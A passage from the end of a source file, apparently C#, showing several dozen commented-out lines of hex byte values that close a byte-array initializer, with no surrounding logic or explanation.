        //0x9E,0x4F,0x99,0x5D,0xA2,0xDC,0xD6,0x20,0x91,0x08,0x8F,0x5A,0x8C,0x1D,0x68,0x4B,0xB0,0xC2,0xE7,0x00,
        //0x40,0xEC,0x91,0xF2,0x2B,0xA8,0x0B,0xD8,0xD5,0x5D,0x92,0x78,0x4C,0x55,0xFA,0x3B,0x6A,0x4D,0x3A,0x89,
        //0xF2,0xA5,0x1E,0x84,0x62,0xE3,0xA4,0x1B,0x25,0x55,0x45,0x6D,0x2A,0x91,0xFF,0x61,0xAE,0x2F,0x53,0xBC,
        //0xFC,0x1E,0x9A,0x4A,0x5D,0x02,0x7B,0xEC,0x9C,0xD2,0xBD,0x41,0x8A,0x4E,0x38,0x32,0xF5,0x51,0xBC,0x3D,
        //0xE8,0x2F,0x30,0x6C,0x7C,0x68,0xD9,0xD7,0xF8,0x9F,0xF3,0x24,0x8D,0x52,0x86,0xEA,0x99,0xB8,0x1D,0xF5,
        //0x7F,0x8F,0x6A,0x1A,0x72,0x72,0x52,0xC2,0x3E,0x64,0x1B,0x5B,0x1A,0xD6,0x95,0x8B,0x2A,0xFD,0xCC,0x68,
        //0x57,0x79,0x3C,0x34,0x8F,0xE6,0x63,0x3E,0xD2,0x9D,0x5A,0x54,0x65,0xC5,0xF1,0xF5,0x41,0x80,0x43,0x6B,
        //0xC3,0x63,0x26,0xD6,0x53,0x11,0x8E,0x5B,0xA4,0x0C,0x53,0x2A,0x44,0x31,0x49,0x2A,0xFB,0xC8,0xEE,0xBA,
        //0x76,0x77,0xEC,0xA2,0x3B,0x9C,0x2F,0x3B,0xC6,0x00,0x13,0x9A,0x75,0x93,0x90,0x39,0xAE,0x6E,0x03,0x1D,
        //0xBC,0xCB,0x74,0x8E,0xC5,0x00,0x7B,0x84,0x62,0xC6,0x0D,0x5E,0x21,0x39,0x58,0xC0,0xA0,0x5C,0xFE,0x86,
        //0x64,0x53,0xE3,0xDD,0xB2,0xBE,0x10,0x48,0x9D,0xD6,0xEF,0xBF,0xC6,0x39,0xCF,0xE2,0xCC,0xDE,0xFA,0x13,
        //0x46,0xAC,0x8E,0x0E,0xA3,0x59,0x76,0xC2,0x31,0x91,0x9B,0x4B,0x79,0x30,0x04,0xE5,0x83,0x7C,0x64,0xF1,
        //0xF5,0x28,0x83,0x7E,0x44,0xC4,0x4D,0xC4,0x73,0x8E,0xBB,0x2B,0x11,0xC5,0x43,0x7F,0xA3,0xFA,0x3D,0x20,
        //0x62,0x94,0xAE,0x89,0x52,0xDD,0xF2,0xA4,0x01,0x6C,0x19,0xCA,0xF1,0x3A,0xD6,0x21,0xB8,0x59,0xB8,0xA0,
        //0x11,0xB7,0x03,0x74,0x85,0xE5,0x79,0xF9,0x15,0xCE,0x43,0x7F,0x06,0x2B,0x88,0xDE,0x51,0x70,0xF3,0x23,
        //0x03,0x97,0x0E,0x5C,0xF3,0x3C,0x35,0x37,0x46,0xEE,0xB5,0x04,0x93,0x46,0x45,0x7C,0x19,0x54,0xF0,0xAA,
        //0x63,0x95,0x2F,0x25,0xE4,0x0F,0x3B,0x19,0x02,0xF2,0xFD,0xD4,0xA4,0x94,0x4D,0xC3,0xDB,0x66,0xCF,0x53,
        //0x18,0x87,0x1B,0x6F,0x07,0x76,0x12,0xD0,0x39,0xFF,0x5F,0xE6,0xB9,0x74,0xAD,0x75,0xBE,0xCD,0xA7,0x6B,
        //0x42,0xAA,0x76,0x04,0x7C,0x18,0xD7,0x5A,0x1C,0xB3,0xD8,0xDA,0x00,0xB5,0xF5,0x4A,0x63,0xA0,0x06,0x4D,
        //0x8F,0xF5,0x89,0x8E,0x8F,0x63,0xE0,0x20,0x2B,0xF6,0x44,0xAE,0xD3,0xE1,0xFA,0xA3,0x98,0x9B,0x16,0x75,
        //0xCF,0xBE,0x10,0xDB,0x47,0xF9,0xD6,0x97,0x3B,0xF4,0xE6,0x10,0xDB,0xBE,0x57,0xB5,0xC3,0xB0,0xD3,0x71,
        //0x0B,0x65,0xEF,0xA7,0x87,0x37,0xFF,0x9C,0x1F,0x39,0xB9,0x88,0xA7,0xBF,0x19,0x93,0x41,0x26,0x75,0x45,
        //0x16,0x95,0xEB,0x4D,0x5F,0xC0,0xD2,0x67,0xD3,0xB9,0x34,0x57,0xEA,0x15,0xE3,0x68,0x65,0xD9,0xA8,0x97,
        //0xA9,0x0F,0xB0,0xB7,0xC5,0x4E,0x46,0x13,0x76,0x87,0x14,0xB7,0x5E,0xA1,0x9A,0x19,0x4E,0xEE,0xA3,0x81,
        //0x35,0x04,0x7F,0x98,0x5D,0x6E,0xBC,0x86,0xC8,0xD9,0x00,0x5F,0x91,0x53,0x98,0x54,0x3B,0xCB,0x88,0x0A,
        //0x2F,0x2E,0xEF,0xE0,0x51,0x3F,0xBD,0x27,0x26,0x4A,0x31,0x9A,0x59,0x04,0xAC,0x28,0xFC,0x94,0x1B,0xA5,
        //0x74,0xC1,0x2D,0xCE,0xAE,0x1E,0xDE,0xC6,0x5A,0xA0,0x11,0xC8,0x8B,0xBE,0x0C,0x19,0x15,0xED,0xD2,0x77,
        //0x0D,0x84,0xED,0xD1,0x66,0xDC,0x5E,0xAD,0x76,0xFC,0x06,0xDA,0xFB,0xEA,0xD5,0xAB,0xE4,0xDF,0x89,0xFD,
        //0xCE,0x12,0x8F,0x32,0x14,0x79,0x06,0xC0,0x32,0xF2,0xB1,0xD0,0x41,0xB9,0x0F,0xA9,0x35,0xBD,0x07,0x03,
        //0xA7,0x97,0x9C,0xDB,0xD3,0x4A,0x6A,0xC7,0xEF,0x21,0xD9,0xDC,0x5C,0x46,0x68,0xD3,0x0C,0xF0,0x4F,0xAA,
        //0x1D,0xA7,0xD3,0x1F,0xF9,0x53,0xEA,0x42,0xD0,0x70,0xA7,0xCE,0x10,0x3E,0x2B,0x58,0xA0,0x64,0x93,0xBA,
        //0xE6,0xA3,0xD7,0xEB,0x53,0x00,0xB1,0x98,0xC3,0x61,0xDC,0x4F,0x52,0xE0,0x3F,0xC7,0xCF,0x31,0x92,0x52,
        //0x44,0xED,0x73,0x84,0x21,0xB3,0x1D,0x8D,0x2E,0x4C,0xB8,0xFC,0xDD,0x7C,0x1B,0x04,0x2D,0x12,0xA2,0x2A,
        //0x4B,0xBD,0x0D,0x07,0x71,0x79,0x35,0x68,0x95,0x02,0x0F,0x42,0xE2,0x97,0xA7,0x26,0x45,0x19,0x42,0xC2,
        //0xF9,0x57,0x06,0x29,0xE3,0x85,0x17,0xA7,0x5B,0xF3,0x3F,0x64,0xBA,0x3A,0x46,0xA5,0x8D,0x81,0x17,0xCA,
        //0x6B,0x23,0x34,0xC9,0xFC,0x53,0x74,0x74,0x28,0x91,0xBF,0x0F,0x18,0x57,0x19,0x01,0x34,0x75,0x5F,0x90,
        //0x51,0xA4,0xE9,0xF5,0x6F,0x3E,0xBB,0xBD,0x75,0xF3,0xE0,0x64,0x82,0x7D,0x2F,0xD3,0xB4,0xA4,0x3A,0x17,
        //0xD9,0xEE,0xEA,0x62,0xC9,0x88,0xA5,0xCB,0x07,0x3B,0x91,0xA0,0x44,0x15,0xD4,0x08,0x99,0x09,0x3F,0x61,
        //0x32,0xD5,0xAA,0x8E,0x55,0xCB,0x50,0x37,0x36,0xE7,0x7F,0xBD,0x3A,0x47,0x07,0x20,0xEF,0x6A,0x14,0x62,
        //0x61,0x99,0x8E,0x80,0x2E,0xD2,0x8A,0xF3,0xC0,0x88,0xC1,0x91,0x34,0x0B,0x10,0xE6,0xA3,0xC4,0xAE,0xDB,
        //0xA4,0x80,0x1F,0xFF,0x8E,0x7B,0x7B,0xBD,0x81,0x3E,0xB7,0x6B,0xD7,0xDB,0x7A,0x68,0x00,0x03,0x72,0x23,
        //0xF7,0x9D,0x31,0x13,0xAC,0x7B,0x73,0xD0,0x08,0x49,0x09,0x4B,0x52,0xED,0x74,0x34,0x4A,0xFC,0xEE,0x87,
        //0xC4,0xD8,0x3A,0x62,0x5A,0x9B,0x70,0xA9,0xAC,0xA1,0x8A,0xF4,0xC2,0xB1,0xF8,0xE4,0x89,0x4D,0xA7,0x11,
        //0x59,0xD5,0x0B,0x4F,0x7F,0x36,0x99,0x0F,0x53,0x5C,0x9D,0x6B,0x3E,0xA9,0x8B,0x2E,0xB0,0xC0,0x80,0xF3,
        //0x28,0xBB,0x56,0xC0,0x4D,0x5C,0x43,0x30,0x8F,0x08,0xCD,0x8A,0x95,0xA7,0x38,0x0E,0x21,0x42,0x99,0xA5,
        //0x31,0x47,0x17,0x51,0xE5,0xD2,0xB6,0x65,0x9B,0x34,0xFD,0x3E,0xA4,0x77,0x22,0xA7,0x00,0x3B,0x47,0x62,
        //0x04,0x5D,0xB9,0xE1,0xF0,0x4A,0x79,0xB0,0x74,0xA8,0xA9,0x23,0x3D,0x2F,0x4E,0xAC,0x93,0xE7,0x5B,0x52,
        //0xBE,0x1E,0x0B,0xD0,0x16,0x2D,0x18,0x1A,0xA9,0x7D,0xAF,0x15,0x89,0x3C,0x49,0x87,0x8B,0xFC,0xB2,0x1A,
        //0x2D,0xA2,0xBC,0x7E,0x46,0x13,0x51,0xD5,0xC4,0xA5,0xF1,0xAB,0x8E,0x82,0xB5,0x89,0x91,0xDD,0x6D,0xA5,
        //0x18,0x08,0xE0,0xE2,0x69,0x95,0x3F};
    }
}
